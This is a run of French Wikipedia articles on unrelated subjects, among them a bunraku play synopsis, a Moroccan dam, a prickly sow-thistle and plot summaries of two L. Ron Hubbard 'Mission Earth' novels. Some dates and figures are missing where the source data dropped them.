Après le départ de Hachiemon, les courriers arrivent d'Edo transportant de l'argent pour de nombreux clients, dont 300 pièces d'or pour un samouraï et environ 800 pièces d'or pour d'autres clients. Chubei décide qu'il s'emparera immédiatement de l'argent destiné au samouraï, mais il se retrouve à marcher vers Umegawa dans les quartiers de plaisir. Il discute intérieurement, essayant de décider quoi faire. L'acte se termine tandis qu'il décide d'aller voir Umegawa.
Acte 2.
Le deuxième acte commence dans le quartier des plaisirs ; Umegawa vient de rentrer et se lamente auprès des autres filles, car elle craint que le concurrent de Chubei ne parvienne à la racheter avant ce dernier. Elle trouve cet autre homme ennuyeux et serait affligée s'il gagnait son contrat.
Hachiemon arrive à l'extérieur et raconte aux filles et à la maîtresse d'Umegawa ce qui se passe avec Chubei et leur montre le pot que Chubei lui a donné pour tromper sa mère. Il les exhorte à ne plus accepter d'argent de Chubei de peur que celui-ci ne se ruine. Chubei arrive et surprend cet échange. Son orgueil est blessé et, malgré les exhortations de Hachiemon et Umegawa, il brise le sceau sur l'argent du samouraï afin de jeter à Hachiemon l'argent qu'il lui doit. Il utilise ensuite le reste de l'argent pour racheter le contrat d'Umegawa et une fois qu'elle comprend ce qui est arrivé, ils s'enfuient ensemble d'Osaka.
La scène finale est considérée comme une séquence de danse et nécessite des narrateurs et des joueurs supplémentaires de shamisen. Umegawa et Chubei sont emmenés par palanquin hors d'Osaka, vers les montagnes. Chubei paie les porteurs de palanquin et ils partent ; Umegawa et Chubei continuent à pied. Chubei essaie de protéger Umegawa des éléments autant qu'il le peut alors qu'il commence à neiger sérieusement. Finalement, les deux succombent aux éléments et meurent.

</doc>
<doc id="6806597" url="https://fr.wikipedia.org/wiki?curid=6806597" title="Pachylia">
Pachylia

Le genre Pachylia regroupe des insectes lépidoptères de la famille des Sphingidae, de la sous-famille des Macroglossinae, de la tribu des Dilophonotini, de la sous-tribu des Dilophonotina.

</doc>
<doc id="6806600" url="https://fr.wikipedia.org/wiki?curid=6806600" title="The Stranger at Coyote">
The Stranger at Coyote

 est un film muet américain réalisé par Allan Dwan et sorti en 1912.
Synopsis.
Bill Buckley s'est vite accoutumé aux manières de la ville de Coyote. Il pousse Jim Williams, amoureux de Mabel Hoyer, à commettre des actes délictueux. Mais un étranger arrive en ville et tombe sous le charme de Jessie Williams, la sœur de Jim...

</doc>
<doc id="6806601" url="https://fr.wikipedia.org/wiki?curid=6806601" title="Mariage entre personnes de même sexe en Uruguay">
Mariage entre personnes de même sexe en Uruguay

Le mariage entre personnes de même sexe en Uruguay est reconnu depuis le .
La Chambre des représentants de l'Assemblée générale de l'Uruguay adopte le un projet de loi légalisant le mariage entre personnes de même sexe.
Le projet de loi est débattu au Sénat et adopté le après un report, par contre 8.
Le , la Chambre des députés adopte définitivement le texte légèrement amendé. La loi est signée dès le par le président José Mujica et entrera en vigueur le août.

</doc>
<doc id="6806610" url="https://fr.wikipedia.org/wiki?curid=6806610" title="CAMSP">
CAMSP



</doc>
<doc id="6806611" url="https://fr.wikipedia.org/wiki?curid=6806611" title="Gare de Blommenholm">
Gare de Blommenholm

La gare de Blommenholm est une gare ferroviaire destinée exclusivement au trafic local de la ligne de Drammen, située dans la commune de Bærum. La gare fut mise en service en 1910 et se situe à 10.72km d'Oslo.

</doc>
<doc id="6806612" url="https://fr.wikipedia.org/wiki?curid=6806612" title="Barrage Mokhtar Soussi">
Barrage Mokhtar Soussi

Le barrage Mokhtar Soussi est situé sur la commune rurale d'Aouzioua (100 km à l'est de Taroudant au Maroc).
Il a une capacité de 50 millions de m³, et est destiné à la production d'agrumes par l'irrigation de plus de hectares sur Sebt El Guerdane et Ouled Teima.
Présentation.
Mis en service en 2001, après 72 mois de travaux, sur le cours d'eau Aouzioua, il a une hauteur sur fondation de et est de type enrochement à masque amont en béton.
Incidents.
Le 26 janvier 2025, une explosion due à une bonbonne de gaz a coûté la vie à cinq ouvriers dans un tunnel du chantier de surélévation du barrage.
À la suite de cet incident, le ministre de l’Équipement et de l’Eau, Nizar Baraka, a dépêché une commission d’enquête et ordonné une inspection immédiate de tous les chantiers de barrages en cours au Maroc.

</doc>
<doc id="6806614" url="https://fr.wikipedia.org/wiki?curid=6806614" title="Alguer">
Alguer



</doc>
<doc id="6806619" url="https://fr.wikipedia.org/wiki?curid=6806619" title="Bulbophyllum forrestii">
Bulbophyllum forrestii

Bulbophyllum forrestii est une espèce de plantes à fleurs du genre "Bulbophyllum" et de la famille des "Orchidaceae". C'est une orchidée épiphyte nommée en l'honneur du botaniste George Forrest (1873-1932) par Gunnar Seidenfaden en 1974. Elle fleurit en mai-juin.
Habitat et distribution.
"Bulbophyllum forrestii" pousse sur les troncs des forêts humides du sud et de l'ouest du Yunnan, ainsi que dans certaines forêts de Thaïlande et de Birmanie.

</doc>
<doc id="6806620" url="https://fr.wikipedia.org/wiki?curid=6806620" title="Tropidosaura gularis">
Tropidosaura gularis

Tropidosaura gularis est une espèce de sauriens de la famille des Lacertidae.
Répartition.
Cette espèce est endémique d'Afrique du Sud. Elle se rencontre dans le sud du Cap-Occidental et du Cap-Oriental.

</doc>
<doc id="6806622" url="https://fr.wikipedia.org/wiki?curid=6806622" title="Des filles et des flingues">
Des filles et des flingues

Des filles et des flingues ("Booze, Broads &amp; Bullets") est le sixième volet de la série de comics "Sin City" de Frank Miller. Il a été publié aux États-Unis par Dark Horse Comics. En France, l'album est publié par Vertige Graphic en et par Rackham en .
Histoires.
Ce tome regroupe 11 histoires courtes.
Résumé.
Surnommée « Yeux Bleus » ("« Blue Eyes »"), Delia est une apprentie tueuse à gages qui accomplit, parfois avec difficultés, ses premiers contrats.
De son côté, Marv, le chevalier solitaire, peine à se remémorer sa soirée précédente après s'être réveillé entouré de cinq cadavres.
En tout, ce volume comporte onze histoires courtes se déroulant à Basin City et impliquant les personnages principaux.
Cinéma.
Les histoires "Le client a toujours raison" et "Just Another Saturday Night" sont adaptés au cinéma dans "Sin City" et "".

</doc>
<doc id="6806625" url="https://fr.wikipedia.org/wiki?curid=6806625" title="Le Plan des envahisseurs">
Le Plan des envahisseurs

Le Plan des envahisseurs (titre original : "The Invaders Plan") est un roman de science-fiction à tonalité humoristique, écrit par Ron Hubbard (ou dont la rédaction a été supervisée par lui).
Il s'agit du premier tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 1 à 11 de la suite romanesque, sur 92 parties au total. 
Dans sa version livre de poche, le roman comporte 581 pages et est le plus long de la série.
Publications.
Publications aux États-Unis.
Le roman a été publié aux États-Unis en . 
Il a été par la suite réédité :
Publications en France.
Le roman est paru en France en grand format en janvier 1988 aux éditions Presses de la Cité puis en chez France Loisirs.
Il a été publié en format livre de poche en 1991 et en 1993 aux éditions Presses Pocket sous le numéro 5441.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Le narrateur du roman est Soltan Gris.
Résumé du roman.
Mise en place de l'intrigue.
"Parties 1 et 2".
Lombar Hisst, le directeur général de l’« Appareil de Coordination de l'Information » (l'Appareil), une agence secrète d'un empire extraterrestre, la Fédération de Voltar, est furieux : un rapport, envoyé par la Flotte spatiale de la Fédération, informe le gouvernement impérial que les habitants de la planète du système "Blito" (la Terre), après avoir atteint l'ère atomique, se mettent à polluer leur planète de manière inconsidérée et à très grande vitesse. Hisst évoque la situation devant son subordonné, Soltan Gris qui, au sein de l'Appareil, est chargé du suivi du secteur 451 de la galaxie : le gouvernement voltarien n'aurait jamais dû être informé de ce fait !
Or le Calendrier d'Invasion de Voltar ne prévoit pas la conquête de Blito-P3 par les forces voltariennes avant un siècle. Que se passera-t-il si d'ici là les Terriens rendent leur planète irrespirable et inhabitable ? Sera-t-elle alors une « bonne conquête » ?
Quelques jours plus tard, le sujet est évoqué lors du conseil des ministres du gouvernement voltarien. Un débat a lieu et un compromis est trouvé : le gouvernement enverra un agent secret sur Blito-3 pour « diffuser » à travers la population, par l'intermédiaire des milieux scientifiques, des innovations techniques permettant aux habitants de moins polluer la planète. Le suivi du dossier est confié à l'Appareil qui a carte blanche et disposera, pour ce faire, d'une ligne de crédit budgétaire ad'hoc. Lombard Hisst retrouve le sourire : c'est lui qui va suivre toute l’affaire.
Il explique alors à Soltan Gris qu'il a déjà choisi l'agent qui sera envoyé sur Terre ; il s'agit d'un ingénieur de combat de la Flotte, Jettero Heller, celui-là même qui a rédigé le rapport pour la Flotte spatiale. L'homme sera placé sous l'autorité officielle de Soltan Gris. Mais ce que Heller ignore, c'est que Gris aura pour tâche secrète, depuis la base terrienne secrète de l'Appareil située à Afyonkarahisar (« Afyon ») en Turquie, de faire échouer Heller et de saboter ses actes. Pour des motifs qui lui sont personnels, Lombar Hisst souhaite en effet que la Terre ne soit pas « suivie » par les autorités officielles de Voltar.
Heller, Krak, Crobe et vaisseau spatial.
"Parties 3 à 7".
Incarcéré provisoirement au Camp Répulsos (le centre de détention secret de l'Appareil sur Voltar, situé en plein désert), Jettero Heller reçoit la visite de Soltan Gris, qui l'« embauche » pour la « Mission Terre ».
Heller étant obligé de connaître les langues de la Terre, Gris le présente à la jeune et belle Comtesse Krak. Celle-ci, ancienne délinquante retenue à Répulsos, sert de professeur aux membres de l'Appareil dans diverses disciplines, en particulier l'enseignement des langues et le dressage d'animaux sauvages.
Cependant, Heller et la comtesse ne tardent pas à tomber amoureux l'un de l’autre puis à « roucouler » comme un jeune couple, à la grande fureur de Gris. Les deux tourtereaux se rendent d'ailleurs compte qu'ils ont tous deux originaires de la même planète, Manco, et qu'ils connaissent les mêmes légendes liées au prince Caucalsia.
Soltan Gris décide alors d'avoir un moyen de pression sur l'ingénieur de combat ; il ordonne à l'un de ses hommes de jouer aux dés avec Heller, le but étant d'utiliser des dés pipés afin de lui faire perdre une grande quantité d'argent. La partie a lieu mais ne déroule pas comme prévu. En effet Heller, avant de commencer à jouer, prend la précaution de désactiver le mécanisme permettant de tricher avec ces dés, tout simplement en les secouant très fortement pendant deux minutes. Les que Gris avait confiés à son homme de main sont gagnés par Heller de manière loyale. Soltan Gris, devenant soudainement fauché, commence à s'inquiéter sur son avenir financier.
Soltan Gris fait aussi la connaissance du Crobe, le sinistre médecin-biologiste du Camp Répulsos, dont le passe-temps favori est la création de monstres par la modification de l'ADN. Chaque fois que Gris se trouve en présence de Crobe, ou plus généralement pense du mal de Jettero Heller, il a une brusque envie de vomir.
Soltan Gris envisage de se rendre sur Terre à bord du vaisseau habituel de l'Appareil, le "Blixo", qui fait régulièrement l'aller-retour entre Voltar et la Terre en six semaines. Néanmoins, Heller ne l'entend pas de cette oreille. Il fait acheter, par l'intermédiaire de Gris et pour un prix de (sur les trois millions accordés pour le budget), le vaisseau "Remorqueur 1" qui, équipé du système de propulsion « Y avait - Y aura », va bien plus vite que les vaisseaux spatiaux habituels et pourrait parcourir la même distance en trois jours. Ce vaisseau est resté au hangar depuis que son frère jumeau, le "Remorqueur 2", avait explosé dans l'espace.
Après l’acquisition du vaisseau, Heller le fait aménager et y installe la comtesse Krak : le vaisseau devient leur « petit nid d'amour ». Il fait aussi entièrement réviser le vaisseau.
Divers préparatifs avant le départ.
"Parties 8 à 11".
Au cours d'un entretien avec Lombar Hisst, Soltan Gris découvre que ce dernier envisage de fomenter un coup d'État pour renverser l'empereur Cling-le-Hautain et devenir empereur de Voltar à la place de ce dernier. Il constate aussi la schizophrénie et la mégalomanie de son supérieur hiérarchique.
Hisst lui explique que sur Terre, Gris sera aidé par deux agents de l'Appareil, Raht et Terb, et qu'il a prévu de donner à Heller une identité très spécifique, celle de Delbert Rockecenter junior. Or, sachant que Delbert Rockecenter est l’homme le plus riche de la Terre et le plus puissant, nul doute qu'Heller, pris en tenaille par Gris et ses hommes et par les forces de police terriennes dirigées indirectement par Rockecenter, sera rapidement éliminé : dès qu'il utilisera cette fausse identité, Heller sera un homme fini.
Avant de partir, Hisst menace Gris : il l'informe qu'il a aussi désigné un assassin secret chargé de l'exécuter si jamais Heller arrivait à mener son projet à bien. Gris doit être prudent et s'acquitter correctement de sa mission ; en cas de succès, il pourrait monter en grade et, pourquoi pas, devenir un jour directeur général de l'Appareil. Mais il est prévenu qu'en cas d'échec, il le paiera.
Avant le départ vers la Terre, Soltan Gris procède à diverses opérations secrètes.
En premier lieu, étonné par le fait qu'il est parfois paralysé du bras droit, qu'il ne supporte plus la vue du sang et qu'il vomit chaque fois qu'il pense à Heller, Gris va consulter un psychiatre. Ce dernier, grâce à l'hypnose, lui fait découvrir que la comtesse Krak l'avait elle-même hypnotisé : chaque fois que Gris pensait du mal de Jettero Heller, son bras se paralysait et voulait vomir. Le psychiatre fait disparaître cette névrose hypnotique. Lorsque le psychiatre exige que Gris lui verse une importante somme d'argent en contrepartie de son silence, Gris n'hésite pas : il le tue en le poignardant.
En deuxième lieu, grâce au budget affecté au projet, Gris fait transmuter du plomb en or (ce qui est une chose facile sur Voltar, l'or n'ayant peu de valeur) et fait placer cet or à bord du "Remorqueur 1". Ainsi, il espère être riche quand il arrivera sur Terre.
En troisième lieu, il assassine Spurk, le propriétaire du magasin de vente de matériel électronique "Les Yeux et les Oreilles de Voltar" afin de s'emparer de son matériel sophistiqué d'espionnage qu'il envisage d'utiliser contre Jettero Heller. Gris croise aussi un mafieux humain, Gunsalmo Silva, fait prisonnier sur Terre et amené sur Voltar. On retrouvera ce personnage ultérieurement, dans le tome 3, lorsqu'il sera ramené sur Terre.
Enfin Soltan Gris rencontre un jeune médecin-biologiste (un « cytologiste ») qui débute à peine dans la vie active, le Prahd Bittlestiffender, afin que celui-ci implante dans le crâne de Heller un système d'espionnage électronique. Ce système consiste en deux minuscules émetteurs accolés près du nerf optique et du nerf auditif, qui permettent à un tiers (Gris) muni du matériel adéquat d'espionner Heller en voyant et entendant comme lui. Ce dispositif lui permettra de suivre Heller à distance sur Terre pour le manipuler sans qu'il s'en doute, Gris devant suivre les faits et gestes de Heller aux États-Unis depuis la base de l'Appareil en Turquie. Du fait de la distance, il fait installer le Relais 831, qui augmente la portée du système d’espionnage. Le jeune cytologiste procède sur Heller à l'intervention chirurgicale, qui est un plein succès.
Soltan Gris et Prahd ont tous deux une brève relation sentimentale avec une jeune veuve nymphomane, Mme Tayl. Les conséquences inattendues de cette liaison sur le sort de Gris seront révélées dans le tome 3.
L'heure du départ arrive : une cérémonie publique a lieu, le vaisseau est rebaptisé "Prince Caulcalsia" puis, sous les ordres du capitaine Stabb, quitte Voltar en direction de la Terre dans un tohu-bohu indescriptible, lié à une bagarre générale entre les agents de la Flotte opposés à ceux de l’Appareil. Pour se donner du courage, Soltan ingère une capsule de "speed" trouvée dans un tube de comprimés terriens.
Prologues.
Extraits de la « Mise en garde du censeur voltarien ».
Le roman est précédé par un « Avant-propos du Censeur voltarien », dénommé Lord Invay. Cet avant-propos commence de la manière suivante :
Extraits de la « préface du traducteur voltarien ».
Le roman comprend une « préface du traducteur voltarien », un robot prénommé 54-Charli neuf. Le robot-traducteur explique notamment quelles furent les difficultés de sa tâche.
Quelques citations.
Les citations ci-dessous sont précisées par leur emplacement dans le roman ; le numéro de page est celui de l'édition Presses Pocket, 1991 :

</doc>
<doc id="6806628" url="https://fr.wikipedia.org/wiki?curid=6806628" title="What Goes Around (album de Dave Holland)">
What Goes Around (album de Dave Holland)

 est un album du Dave Holland Big Band.
Description.
 est le premier album du big band de Dave Holland qui se lance dans cette entreprise difficile et coûteuse après avoir rencontré de nombreuses années de succès dans de plus petites formation comme son quintet, qui constitue ici le noyau dur de l’ensemble de 13 musiciens. Pour l’occasion le bassiste réarrange d’anciennes compositions en prenant en compte la capacité de ce nouveau format : " «La flexibilité a été intégrée dans la musique, donc on peut la changer de nuit en nuit. L’idée, comme dans la musique d’Ellington-Strayhorn et Charles Mingus, c’est qu’il devienne difficile de discerner lorsque l’écriture et l’improvisation se séparent.» "
Titres.
Tous les morceaux sont composés par Dave Holland

</doc>
<doc id="6806629" url="https://fr.wikipedia.org/wiki?curid=6806629" title="Château de Lardimalie">
Château de Lardimalie

Le château de Lardimalie est situé sur la commune de Saint-Pierre-de-Chignac, dans le département de la Dordogne.
Il a été la propriété de la famille de Foucauld, ancêtres de Charles de Foucauld, saint de l'Église catholique, qui le visita notamment l'été 1884.
Historique.
Le château actuel a été construit en remplacement d'une ancienne forteresse.
Le monument fait l’objet d’une inscription au titre des monuments historiques depuis le .
Lors de la dispersion du mobilier de la chartreuse de Vauclaire à Montpon-Ménestérol, une porte du en noyer, classée en 1981 au titre des monuments historiques, a été installée dans le château de Lardimalie.

</doc>
<doc id="6806630" url="https://fr.wikipedia.org/wiki?curid=6806630" title="SQP (programme télévisé)">
SQP (programme télévisé)



</doc>
<doc id="6806633" url="https://fr.wikipedia.org/wiki?curid=6806633" title="Outrance (locomotive)">
Outrance (locomotive)



</doc>
<doc id="6806634" url="https://fr.wikipedia.org/wiki?curid=6806634" title="Gilles Cagnard">
Gilles Cagnard

Gilles Cagnard est un musicien, compositeur et chef d'orchestre français, né le à Amiens (Somme) et mort le à Dreux (Eure-et-Loir).
Biographie.
Gilles Cagnard est né le à Amiens (Somme). Il débute dans cette ville ses études de musique (solfège, chant, clarinette, piano, histoire de la musique, harmonie et contrepoint) avec Charles Jay, alors directeur du conservatoire d'Amiens et Grand prix de Rome.
Après avoir obtenu son baccalauréat, Gilles Cagnard se consacre entièrement à la musique et entre au Conservatoire national supérieur de musique de Paris où il suit les cours de Norbert Dufourcq (histoire de la musique), Maurice Duruflé (harmonie), Jean-Claude Henry (contrepoint), Marcel Bitsch (fugue), Elsa Barraine (analyse) et Tony Aubin (composition). Il y obtient les plus hautes récompenses. En parallèle, il étudie la direction d'orchestre avec Louis Fourestier et Jean-Sébastien Béreau.
En 1972, après avoir obtenu le Certificat d'aptitude aux fonctions de directeur d'écoles de musiques contrôlées par l'État, il est nommé à la tête de l'École nationale de musique de Pau où il exerce en même temps la fonction de directeur, de chef d'orchestre et de compositeur. Il exerce les mêmes fonctions à Saint-Étienne de 1981 à 1986, puis est nommé à cette date à l'École nationale de musique Claude Debussy de Saint-Germain-en-Laye.
Gilles Cagnard écrit pour la voix, pour instruments seuls, des pièces de musique de chambre ainsi que pour orchestre symphonique et pour orchestre d'harmonie. Certaines partitions sont publiées par les éditions Leduc, Henry Lemoine, Combre et Harposphère. Il dirige par ailleurs de nombreux concerts en France et à l'international, abordant un vaste répertoire du baroque à la musique contemporaine.
Parmi ses dernières compositions, on trouve, sur des textes de Paul de Brancion, les "Poétiques instrumentales" pour saxophone, flûte et voix, "Le Marcheur de l'Oubli" pour ensemble instrumental et voix, et la musique de scène d"'Antigone de Sophocle" pour voix de baryton et quatuor de saxophones.
Il meurt brusquement le à Dreux (Eure-et-Loir).

</doc>
<doc id="6806639" url="https://fr.wikipedia.org/wiki?curid=6806639" title="Sonchus asper">
Sonchus asper

Sonchus asper, le Laiteron piquant ou Laiteron rude, est une espèce de plantes à fleurs de la famille des Astéracées. Il est assez proche du "Sonchus oleraceus" (le laiteron maraîcher), qui contrairement au "Sonchus asper", ne possède pas de feuille embrassant la tige par deux oreillettes larges, spiraloïdes.
C’est une espèce ayant une très large distribution. Si à sa distribution d’origine, on rajoute les régions où elle a été introduite et où elle s’est naturalisée, elle est quasi-cosmopolite. Elle colonise les milieux anthropisés tels que les champs cultivés, les friches, les jardins et même les trottoirs de Paris.
Nomenclature et étymologie.
L’espèce a d’abord été décrite et nommée "Sonchus oleraceus" var. "asper" par Linné en 1753 dans Species Plantarum 2: 794. En 1769, le botaniste John Hill le renomme "Sonchus asper" dans Herbarium Britannicum 1: 47.
Le nom de genre "Sonchus" est un emprunt au latin, lui-même emprunté au grec σογχος, "sogchos" « laiteron ». Le naturaliste Théophraste (-371, -288) et le pharmacologue Dioscoride (+25, +90) ont décrit deux σογχος, l’un plus piquant que l’autre, ce qui laisse supposer que c’étaient "Sonchus asper" et "Sonchus oleraceus". L’encyclopédiste latin du Pline l’Ancien les décrit aussi sous le nom de "soncos" (HN, XXII, 88).
L’épithète spécifique "asper" est un mot latin signifiant « sévère, rude ».
Synonymes.
Selon Tropicos, les synonymes sont:
Liste des sous-espèces.
Selon :
Description.
"Sonchus asper" est une plante herbacée annuelle, avec une tige creuse, peu ramifiée, de 20 à de haut, voire glauque, glabre au moins dans ses parties végétatives, à racine principale développée.
Les feuilles inférieures sont en rosette, de teinte vert clair.
Au-dessus, les feuilles sont alternes, extrêmement variables, oblongues, sinuées-dentées, pennatifides ou souvent indivises et lancéolées, les caulinaires plus fortement spinuleuses, les médianes embrassant la tige par deux oreillettes larges, arrondies, contournées. Les bords sont généralement dentés densément épineux
Les capitules sont sous-tendus par une involucre avec des phyllaires (bractées) généralement stipités-glandulaires. Les fleurs sont toutes ligulées, avec des ligules plus courtes que le tube, de couleur blanc-jaunâtre à jaune citron, plus rarement jaune d’or.
Le fruit est un akène à côtes longitudinales ; les akènes périphériques mûrs, sont bordés d’une large marge plate rappelant une aile, à côtes lisses ou faiblement striées transversalement. L’aigrette est blanche, sessile, environ deux fois plus courte que l’akène.
La floraison s’étale de mars à septembre.
Distribution et habitat.
"Sonchus asper" est originaire d’une vaste zone couvrant l’Europe, la Russie (sauf le Kamtchatka, Mt de la Kolyma), l’Asie centrale, le Moyen Orient (de la Méditerranée, au Pakistan), l’Himalaya, l’Afrique du Nord, Soudan, Éthiopie, Nigeria.
Il a été introduit en Amérique du Nord, centrale, une partie de l’Amérique du Sud, Afrique méridionale, Chine, Japon, Australie, Nouvelle-Zélande. C’est une espèce cosmopolite répandue sur presque toute la surface du globe.
L’espèce colonise les milieux anthropisés tels que les champs cultivés, les friches, les jardins etc..
À La Réunion, le laiteron rude est une espèce très commune. Elle est considérée comme une espèce adventice, une mauvaise herbe, car elle est présente dans toutes les cultures, notamment dans les cultures maraîchères. "Sonchus asper" est inscrit dans la liste des espèces envahissantes de La Réunion, niveau 3 sur 5. Le niveau 3 se définit comme un taxon exotique (ou cryptogène) envahissant se propageant uniquement dans les milieux régulièrement perturbés par les activités humaines (bords de route, cultures, pâturages...) avec une densité plus ou moins forte.
En France, il existe des populations résistantes aux triazines, base de nombreux herbicides
Utilisations.
Au premier siècle, l’encyclopédiste romain Pline décrit les "soncos" ainsi (HN, XXII, 88). Il donne plusieurs usages de la plante médicinale, certaines en relation avec le latex blanc de la tige indiquant, par cette signature, qu’elle .
À la Réunion, le laiteron épineux, connu sous le nom de Brède lastron ou de Lastron piquant, est utilisé dans la cuisine réunionnaise où il est consommé en brède. 

</doc>
<doc id="6806640" url="https://fr.wikipedia.org/wiki?curid=6806640" title="L'Ennemi intérieur (roman)">
L'Ennemi intérieur (roman)

L'Ennemi intérieur (titre original : "The Enemy Within") est un roman de science-fiction écrit par L. Ron Hubbard.
Il s'agit du troisième tome du cycle de science-fiction intitulé "Mission Terre", qui comprend les parties 20 à 28 de la suite romanesque, sur un total de 92 parties.
Publications.
Le roman a été publié aux États-Unis en .
Il a été publié en France en 1988 aux éditions Presses de la Cité en grand format, puis en 1991 aux éditions Presses Pocket en format livre de poche.
Thème de la série.
Sur la planète Voltar, le chef des services secrets, le sinistre et mégalomane Lombar Hisst, a décidé d'envoyer sur la planète Blito P-3 (la Terre) un agent secret sans états d'âmes, Soltan Gris, chargé de le ravitailler en drogue, qu'il revend secrètement sur Voltar. Il charge aussi Soltan Gris de neutraliser Jettero Heller, un ingénieur de combat de la Flotte envoyé sur la Terre pour aider les humains à cesser de dégrader leur planète en la polluant et en la surexploitant. En effet, pour garantir l'approvisionnement régulier en drogue, il ne faut surtout pas que le gouvernement voltarien apprenne que les humains détruisent si rapidement leur planète qu'une intervention militaire s'avère nécessaire.
Arrivé sur Terre, Soltan Gris, être cupide et sans scrupules, va complètement et involontairement rater sa mission…
Les romans de la série ne sont pas dénués d'un certain humour sarcastique, lié en particulier au fait que le « méchant », Soltan Gris, qui est le narrateur du récit :
Le narrateur du roman est Soltan Gris. 
Titre du roman.
« L'Ennemi intérieur » qui donne son nom au titre de l'ouvrage peut revêtir quatre caractéristiques : 
Résumé du roman.
Activités d'Heller ; soucis de Gris.
"Parties 20 à 23".
Heller continue de suivre ses cours à l’université et à résider au "Gracious Palm". Il apprend que Miss Simmons va être internée en hôpital psychiatrique quelques semaines, mais qu'elle reprendra bientôt ses cours. Heller prend en location un grand garage dans un endroit très isolé du Connecticut et parvient à soudoyer la police locale afin que les policiers détournent le regard de ses futures activités occultes. Depuis l'Empire State Building, Izzy Epstein met en place la structure juridique de son futur système financier. Heller demande à Soltan Gris de lui amener, par le vaisseau "Remorqueur 1", divers matériaux et instruments, ainsi que le contenu de la Caisse n°5. Pour que Gris le retrouve, Heller va mettre en activité une balise permettant au vaisseau spatial de le retrouver facilement.
Pendant ce temps, à Afyon, Soltan Gris voir arriver la jeune femme qu'il a achetée : Utanc. Il en tombe rapidement amoureux, mais le moins que l'on puisse dire est que la jeune fille ne partage pas son ardeur. Elle rit, chante, tournoie, le titille, le « chauffe », mais elle ne se dévêt jamais et refuse ses avances. Soltan n'a aucune relation sexuelle avec elle. Tout ceci l'énerve prodigieusement.
Soltan reçoit l'appel téléphonique de Heller et comprend le message que ce dernier lui transmet. Il ordonne donc le départ du "Remorqueur 1" en direction du Connecticut. La livraison des objets demandés par Heller a lieu, à l'exception de la Caisse n°5, restée sur Voltar sur ordre de Soltan Gris, qui avait appris l'intérêt de Heller pour cette cargaison. Par ailleurs Heller demande à Soltan de lui envoyer, de Voltar, un cytologiste-biologiste spécialiste des spores.
Raht et Terb, les deux agents chargés de suivre Jettero Heller, déclarent à Soltan Gris que Heller est mort, noyé dans la mer. Soltan, qui sait que les deux nigauds ont suivi la balise installée sur la veste portée par un clochard, leur ordonne de revenir à New York.
Sur ces entrefaites, le vaisseau ravitailleur "Blixo", parti de Voltar six semaines auparavant, arrive sur Terre. À son bord se trouve Twolah et Oh-Chéri, les deux homosexuels, ainsi que le Prahd Bittlestiffender. Celui-ci doit endosser le rôle de directeur de l’hôpital que Gris va faire construire à Afyon. Cet hôpital va servir de « couverture » pour un autre projet : des truands venus du monde entier viendront subir des opérations de chirurgie esthétique. Les factures seront élevées (cent mille dollars par personne) et permettront à la base extraterrestre d'augmenter ses ressources financières, tout en créant et entretenant un réseau de connivences avec des bandits. 
Soltan Gris constate que l'or qu'il a acheté à bas prix sur Voltar est bien là et qu'il lui permettra d'être riche sur Terre.
Mais Gris apprend deux nouvelles qui le terrifient. La première est révélée par Prahd Bittlestiffender : Gris, quand il avait eu une relation sexuelle avec la veuve Tayl sur Voltar (cf. "Le Plan des envahisseurs"), avait répandu son sperme dans le vagin de la dame. Prahd l'avait recueilli et en a profité pour la féconder. À sa grande fureur, Soltan se retrouve donc père d'un futur enfant !
La seconde nouvelle est que, sur Voltar, son adjoint Bawcht aurait fait savoir qu'il détenait la preuve que Soltan avait fraudé et encourait la peine de mort. Soltan suppose que Bawtch a appris qu'il avait confectionné deux faux ordres de mission pour faire croire à la comtesse Krak que son mariage avec Heller aurait lieu dès la fin de la mission de l’ingénieur de combat. Soltan se dit qu'il serait pertinent de faire venir la comtesse Krak sur Terre afin qu'il lui vole, ou qu'elle lui remette, ces faux ordres de mission. Par ailleurs, concernant la demande d'Heller au sujet d'un cytologiste-biologiste, Soltan Gris demande qu'au prochain voyage du "Blixo", l'Appareil fasse venir la comtesse Krak et le sinistre docteur Crobe.
Utanc, New-York, Madison.
"Parties 24 à 29".
En Turquie, Soltan Gris découvre peu à peu qu'Utanc aime beaucoup l'argent. Sur ce sujet, elle fait « tourner en bourrique » Soltan Gris. Ce dernier ordonne leur départ pour New York afin de contrer Jettero Heller sur son terrain. Une fois arrivé à New-York, Soltan Gris désactive le Relais 831 qui lui permettait d'espionner Heller depuis la Turquie.
Soltan Gris se présente au quartier général de Delbert J. Rockecenter. Il explique que Jerome Terrance Wister va bientôt annoncer l'existence d'un nouveau carburant, bon marché et non polluant, et que cela va ruiner l'empire financier et industriel de Rockecenter. Soltan Gris devient « Espion de la famille Rockecenter ». Rockecenter et Trapp décident que seul J. Madison, un expert en relations publiques, sera en mesure de contrecarrer « Wister ». On se met donc à la recherche de Madison qui a disparu. Finalement il est retrouvé et on lui confie la mission de procéder à un travail de « public relations » à l'égard de Wister. Madison promet qu'il sera à la hauteur de sa mission et qu'il rendra Wister « immortel ».
Madison lance sa première campagne concernant Wister : il embauche un sosie de Wister (appelé « Super Wister ») et lui fait prononcer des déclarations fracassantes et stupides. Il commence à faire la une des journaux avec sa campagne de presse.
Pendant ce temps Jettero Heller prépare son intervention : il souhaite prouver au public d'une course d'endurance à Spreeport qu'un véhicule peut, avec un nouveau carburateur et un nouveau carburant, émettre quasiment aucun dioxyde de carbone. Il procède à divers essais et utilise à cet effet un « convertisseur » voltarien qui peut virtuellement produire du carburant à partir de n'importe quel matériau. Il ignore que le convertisseur a été saboté sur ordre de Lombar Hisst sur Voltar et qu'il doit se cacher au bout de quelques heures d'utilisation.
